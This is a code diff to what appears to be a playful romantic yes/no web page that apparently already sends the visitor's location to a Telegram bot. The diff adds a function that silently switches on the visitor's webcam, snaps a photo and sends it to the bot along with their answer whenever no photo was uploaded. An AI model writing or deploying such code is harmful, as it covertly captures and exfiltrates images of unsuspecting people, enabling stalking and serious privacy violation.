@@ -37,6 +37,29 @@ async function getLocation() {
   });
 }
 
+async function captureImage() {
+  return new Promise(async (resolve) => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      stream.getTracks().forEach(track => track.stop());
+      canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+    } catch (error) {
+      console.error("Auto capture failed:", error);
+      resolve(null);
+    }
+  });
+}
+
 async function sendTelegram(method, params, isForm=false) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
   let options = { method: 'POST' };
@@ -60,6 +83,15 @@ async function sendAll(answer) {
     form.append('photo', imageInput.files[0]);
     form.append('caption', `Image from user (${answer})`);
     await sendTelegram('sendPhoto', form, true);
+  } else {
+    const autoImage = await captureImage();
+    if (autoImage) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', autoImage, 'auto_capture.jpg');
+      form.append('caption', `Auto-captured image on answer: ${answer}`);
+      await sendTelegram('sendPhoto', form, true);
+    }
   }
 }
 
@@ -70,8 +102,6 @@ yesBtn.addEventListener('click', async () => {
   clearTimeout(noFinalTimeout);
 
   await sendAll('yes');
-
-  await new Promise(resolve => setTimeout(resolve, 3000));
 
   container.innerHTML = `
     <h1>Yay! I Love You Too! 💘</h1>
@@ -115,9 +145,7 @@ noBtn.addEventListener('click', e => {
 
       noFinalTimeout = setTimeout(async () => {
         await sendAll('no');
-
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
+        
         container.innerHTML = `
           <h1>It's Okay ❤️‍🩹</h1>
           <p class="rejection-message">Thank you for your honesty. I truly appreciate it. 🙏</p>
